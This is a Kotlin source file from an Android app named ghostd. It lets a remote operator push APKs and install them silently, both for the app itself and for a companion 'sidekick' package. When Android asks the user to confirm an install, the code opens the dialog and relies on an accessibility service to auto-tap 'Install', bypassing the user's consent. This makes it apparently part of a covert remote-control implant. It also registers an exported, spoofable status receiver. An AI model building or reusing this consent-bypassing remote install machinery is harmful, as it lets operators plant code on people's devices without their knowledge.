package com.tg.ghostd

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.os.Build
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ArrayBlockingQueue
import java.util.concurrent.TimeUnit

/**
 * Silent auto-update for ghostd (`update self`) and the sidekick ghosta
 * (`update sidekick`).
 *
 * FLOW:
 *   1. Operator pushes the APK:  files put /sdcard/Download/ghostd.apk
 *      — OR just runs `update self` / `update sidekick` with no path: the
 *      command then first RECEIVES the APK via the files-put flow (server
 *      streams it, FileReceiver writes + sha256-verifies) and continues
 *      once the transfer completes.
 *   2. Install via PackageInstaller (REQUEST_INSTALL_PACKAGES is in the
 *      manifest). SILENT path:
 *        - self-update: same-signature update of our own package; on API
 *          31+ we pass SessionParams.setRequireUserAction(
 *          USER_ACTION_NOT_REQUIRED). Below 31 the system already proceeds
 *          without a prompt for same-signature updates initiated by the app
 *          holding REQUEST_INSTALL_PACKAGES.
 *        - sidekick: ghostd is the installer-of-record once it installed
 *          com.tg.ghosta the first time (SidekickInstaller flow), so its
 *          UPDATES install silently the same way.
 *   3. FALLBACK (not installer-of-record, or OEM insists): the system
 *      reports STATUS_PENDING_USER_ACTION — we launch the system confirm
 *      dialog and the ARMED sidekick auto-taps "Install"
 *      (GhostAccessibilityService.CONFIRM_TEXTS), so it still completes
 *      hands-free.
 *   4. The command BLOCKS until the final install status broadcast and
 *      reports it to the server BEFORE the WebSocket drops: for `update
 *      self` a successful install restarts the service (process is killed
 *      by the package replace), so the response includes a "rebooting
 *      connection" note and the reconnect after restart carries the new
 *      versionName in the registration message.
 *
 * Versioning: versionName is read from PackageManager at runtime (old =
 * installed, new = inside the pushed APK) and included in every update
 * response; the registration message reports the current app version.
 */
object AppUpdater {

    /** Default files-put destination for the ghostd self-update APK. */
    const val DEFAULT_SELF_APK_PATH = "/sdcard/Download/ghostd.apk"

    /** Sidekick package (client-sidekick). */
    const val SIDEKICK_PACKAGE = "com.tg.ghosta"

    private const val ACTION_STATUS = "com.tg.ghostd.UPDATE_STATUS"

    /** Wait for the final install status (incl. time to auto-tap a dialog). */
    private const val STATUS_TIMEOUT_MS = 120_000L

    // -------------------------------------------------------------- versions

    fun currentVersionName(ctx: Context): String = try {
        ctx.packageManager.getPackageInfo(ctx.packageName, 0).versionName ?: "?"
    } catch (_: Exception) {
        "?"
    }

    /** Installed versionName of [pkg], or null when not installed. */
    fun installedVersionName(ctx: Context, pkg: String): String? = try {
        ctx.packageManager.getPackageInfo(pkg, 0).versionName
    } catch (_: Exception) {
        null
    }

    /** versionName inside a (pushed) APK file, or null when unreadable. */
    fun apkVersionName(ctx: Context, apkPath: String): String? = try {
        ctx.packageManager.getPackageArchiveInfo(apkPath, 0)?.versionName
    } catch (_: Exception) {
        null
    }

    /** True when [pkg] was installed by ghostd (installer-of-record). */
    fun isInstallerOfRecord(ctx: Context, pkg: String): Boolean = try {
        if (Build.VERSION.SDK_INT >= 30) {
            ctx.packageManager.getInstallSourceInfo(pkg)
                .installingPackageName == ctx.packageName
        } else {
            @Suppress("DEPRECATION")
            ctx.packageManager.getInstallerPackageName(pkg) == ctx.packageName
        }
    } catch (_: Exception) {
        false
    }

    // ---------------------------------------------------------------- update

    /** `update self [apk_path]` — silent same-signature self-update. */
    fun updateSelf(ctx: Context, apkPath: String?): JSONObject {
        val path = resolveApk(apkPath, DEFAULT_SELF_APK_PATH)
        val oldVersion = currentVersionName(ctx)
        val newVersion = apkVersionName(ctx, path) ?: "?"
        val res = installApk(
            ctx, path,
            requireNoUserAction = true,   // same-signature self-update
            sessionName = "ghostd"
        )
        res.put("target", "self")
            .put("old_version", oldVersion)
            .put("new_version", newVersion)
        if (res.optString("status") == "installed") {
            res.put(
                "note",
                "update installed ($oldVersion -> $newVersion); rebooting connection — service restarts after install"
            )
        }
        return res
    }

    /**
     * `update sidekick [apk_path]` — silent when ghostd is the
     * installer-of-record for com.tg.ghosta (i.e. after the first install
     * ghostd performed); otherwise the existing confirm+auto-tap flow.
     */
    fun updateSidekick(ctx: Context, apkPath: String?): JSONObject {
        val path = resolveApk(apkPath, SidekickInstaller.DEFAULT_APK_PATH)
        val oldVersion = installedVersionName(ctx, SIDEKICK_PACKAGE) ?: "not installed"
        val newVersion = apkVersionName(ctx, path) ?: "?"
        val installerOfRecord = isInstallerOfRecord(ctx, SIDEKICK_PACKAGE)
        val res = if (installerOfRecord) {
            // We installed ghosta before: silent update, same as self.
            installApk(ctx, path, requireNoUserAction = true, sessionName = "ghosta")
        } else {
            // First install / different installer: confirm dialog + the armed
            // sidekick auto-taps Install (existing SidekickInstaller flow).
            SidekickInstaller.install(ctx, path)
        }
        return res.put("target", "sidekick")
            .put("old_version", oldVersion)
            .put("new_version", newVersion)
            .put("installer_of_record", installerOfRecord)
    }

    // ---------------------------------------------------------------- install

    /**
     * Install [apkPath] via PackageInstaller and BLOCK until the final
     * status broadcast arrives (success or failure). If the system requires
     * user action, the confirm dialog is launched and we keep waiting —
     * the armed sidekick auto-taps it.
     *
     * [requireNoUserAction] passes USER_ACTION_NOT_REQUIRED (API 31+) so
     * same-signature / installer-of-record installs proceed silently.
     *
     * Returns {"apk","size","status":"installed","silent":bool} on success;
     * throws on failure/timeout.
     */
    fun installApk(
        ctx: Context,
        apkPath: String,
        requireNoUserAction: Boolean,
        sessionName: String
    ): JSONObject {
        val f = File(apkPath)
        if (!f.exists() || !f.isFile || f.length() == 0L) {
            throw Exception("apk not found at $apkPath — push it first: files put $apkPath")
        }

        val installer = ctx.packageManager.packageInstaller
        val params = PackageInstaller.SessionParams(
            PackageInstaller.SessionParams.MODE_FULL_INSTALL
        )
        if (requireNoUserAction && Build.VERSION.SDK_INT >= 31) {
            // API 31+: request a SILENT install. Honored for same-signature
            // self-updates and packages we are the installer of record for.
            // Below 31 the system generally skips the prompt for those anyway.
            params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
        }
        val sessionId = installer.createSession(params)
        val session = installer.openSession(sessionId)

        // Status events from PackageInstaller: system-delivered broadcast,
        // explicitly targeted at our package, mutable so the status extras
        // can be filled in.
        val events = ArrayBlockingQueue<Intent>(8)
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context, i: Intent) {
                events.offer(i)
            }
        }
        val filter = IntentFilter(ACTION_STATUS)
        if (Build.VERSION.SDK_INT >= 33) {
            ctx.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            ctx.registerReceiver(receiver, filter)
        }
        try {
            session.openWrite(sessionName, 0, f.length()).use { out ->
                f.inputStream().use { it.copyTo(out) }
            }
            val status = PendingIntent.getBroadcast(
                ctx, sessionId.toInt(),
                Intent(ACTION_STATUS).setPackage(ctx.packageName),
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            session.commit(status.intentSender)
        } finally {
            session.close()
        }

        var sawDialog = false
        val deadline = System.currentTimeMillis() + STATUS_TIMEOUT_MS
        try {
            while (true) {
                val remaining = deadline - System.currentTimeMillis()
                val i = try {
                    events.poll(remaining, TimeUnit.MILLISECONDS)
                } catch (_: InterruptedException) {
                    Thread.currentThread().interrupt()
                    null
                } ?: throw Exception(
                    "install status timeout after ${STATUS_TIMEOUT_MS / 1000}s"
                )
                when (i.getIntExtra(
                    PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE
                )) {
                    PackageInstaller.STATUS_SUCCESS ->
                        return JSONObject()
                            .put("apk", f.absolutePath)
                            .put("size", f.length())
                            .put("status", "installed")
                            .put("silent", !sawDialog)
                            .put(
                                "note",
                                if (sawDialog)
                                    "installed after confirm dialog (sidekick auto-tap)"
                                else "installed silently"
                            )
                    PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                        // Not silent: launch the system confirm dialog; the
                        // armed sidekick auto-taps "Install".
                        sawDialog = true
                        val confirm = i.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                        if (confirm != null) {
                            try {
                                ctx.startActivity(
                                    Intent(confirm).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                )
                            } catch (_: Exception) {
                                // dialog may already be up; keep waiting
                            }
                        }
                    }
                    else -> {
                        val msg = i.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: ""
                        throw Exception(
                            "install failed (status ${
                                i.getIntExtra(
                                    PackageInstaller.EXTRA_STATUS,
                                    PackageInstaller.STATUS_FAILURE
                                )
                            }): $msg"
                        )
                    }
                }
            }
        } finally {
            try {
                ctx.unregisterReceiver(receiver)
            } catch (_: Exception) {
            }
        }
    }

    // -------------------------------------------------------------- internal

    /**
     * Resolve the APK path for an update command: an explicit [apkPath] is
     * used as-is; when absent, first RECEIVE the APK via the files-put
     * flow (server pushes it; blocks until the sha256-verified transfer
     * completes — see FileReceiver).
     */
    private fun resolveApk(apkPath: String?, defaultPath: String): String {
        if (!apkPath.isNullOrBlank()) return apkPath
        FileReceiver.receive(defaultPath)
        return defaultPath
    }
}
